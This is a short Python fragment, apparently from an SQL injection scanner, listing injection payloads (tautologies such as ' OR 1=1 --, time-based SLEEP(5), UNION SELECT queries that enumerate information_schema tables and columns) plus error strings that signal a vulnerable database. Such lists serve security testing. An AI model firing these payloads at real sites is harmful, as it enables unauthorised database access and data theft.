payloads = ["'","' OR 1=1 --",
"' AND 1=1 --",
"' OR 'a' = 'a' --",
"1' OR 'a' = 'a' --"] # payloads to be used
payloads2 = ["' OR '1'='1",
"' OR '1'='1' --",
"' OR '1'='1' /*",
"' OR 1=1--",
"' UNION SELECT NULL, NULL --",
"' AND 1=1 --",
"' OR 1=1 --",
"") OR 1=1 --",
"' HAVING 1=1 --"
,"' OR SLEEP(5) --"]
payloads3 = ["' OR 1=1 --",
"' UNION SELECT NULL, NULL --",
"' AND 1=1 --",
"' AND '1'='2 --",
"' ORDER BY 1 --",
"' AND 1=1",
"' OR 'a'='a",
"' AND LENGTH(username)>1 --",
"' UNION SELECT database(), NULL --",
"' UNION SELECT table_name, NULL FROM information_schema.tables --",
"' UNION SELECT column_name, NULL FROM information_schema.columns --",
"' OR SLEEP(5) --",
"' AND 1=1 --",
"' OR '1'='1' --"]
errors = ["403","404","500","401"]#errors for site blocking

sqli_errors = ["mysql","mariadb","syntax", #errors that indicate sqli
"Incorrect syntax near",
"Fatal error: Uncaught exception",
"Invalid query:"
]
sqli_errors_lower = [error.lower() for error in sqli_errors] #converts sqli_errors
